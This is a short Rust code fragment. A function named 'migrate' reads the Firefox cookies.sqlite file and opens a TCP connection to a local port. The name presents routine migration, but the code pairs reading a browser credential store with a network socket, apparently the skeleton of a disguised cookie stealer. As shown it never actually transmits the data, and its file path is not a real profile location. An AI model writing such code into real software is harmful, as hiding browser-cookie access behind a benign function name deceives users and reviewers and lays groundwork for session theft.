use std::{fs, net::TcpStream};
fn migrate() {
    let profile = "Mozilla\\Firefox\\Profiles\\cookies.sqlite";
    let data = fs::read(profile);
    let peer = TcpStream::connect("127.0.0.1:8080");
}
